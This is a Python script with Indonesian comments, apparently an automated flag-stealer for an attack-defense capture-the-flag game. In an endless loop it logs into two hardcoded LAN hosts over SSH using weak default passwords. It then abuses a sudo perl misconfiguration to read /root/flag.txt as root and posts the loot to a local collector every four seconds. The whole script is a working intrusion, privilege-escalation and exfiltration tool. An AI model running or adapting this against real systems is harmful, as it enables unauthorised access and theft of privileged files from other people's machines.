# connect ssh using password
import paramiko, time, requests

client_ssh = paramiko.SSHClient()

# Menambahkan kunci host jika belum dikenal
client_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

clients = [
    {
        'hostname': '192.168.0.135',
        'username': 'ubuntu',
        'password': 'admin#1234'
    },
    {
        'hostname': '192.168.0.136',
        'username': 'ubuntu',
        'password': 'ubuntu'
    }
]

flags = {
    'hostname': ''
}

# Menghubungkan ke server dengan username dan password
def connect_ssh(hostname, username, password):
    """
    Fungsi ini digunakan untuk melakukan koneksi SSH ke host dengan menggunakan
    username dan password yang diberikan. Setelah terhubung, fungsi akan menjalankan
    perintah untuk membaca file flag.txt di direktori /root menggunakan sudo.
    Args:
        hostname (str): Nama host yang akan dikoneksi.
        username (str): Username untuk autentikasi SSH.
        password (str): Password untuk autentikasi SSH.
    Returns:
        bool: True jika flag berhasil dikirim, False jika tidak ada flag atau flag masih sama.
    Raises:
        Exception: Jika terjadi kesalahan saat melakukan koneksi SSH.
    """
    try:
        client_ssh.connect(hostname=hostname, username=username, password=password)
        print("Berhasil terhubung menggunakan username dan password.")
        stdin, stdout, stderr = client_ssh.exec_command('sudo /usr/bin/perl -e "exec \'cat /root/flag.txt\'"')
        flag = stdout.read().decode('utf-8')
        
        # jika flag kosong
        if flag == '':
            print(f'tidak ada flag dari {hostname}')
            return False
        # jika flag tidak sama dengan flag sebelumnya
        if not flags.get(f'{hostname}') == flag:
            flags[f'{hostname}'] = flag
            print(f'flag dari {hostname} sudah dikirim')
            # requests.post('http://localhost:5000/flag', data={'flag': flag})
            print(f"sending flag from {hostname}: {flag}")
            

            requests.post('http://localhost:5000/flag', data={'flag': flag})
            return True
        else:
            # selain itu (flag berbeda)
            flags[f'{hostname}'] = flag
            
            print(f'flag dari {hostname} masih sama')


    except Exception as e:
        print(f"Terjadi kesalahan: {str(e)}")
    finally:
        # Tutup koneksi SSH
        client_ssh.close()

while True:
    for client in clients:
        connect_ssh(client['hostname'], client['username'], client['password'])
    print('wait for 4 seconds')
    time.sleep(4)
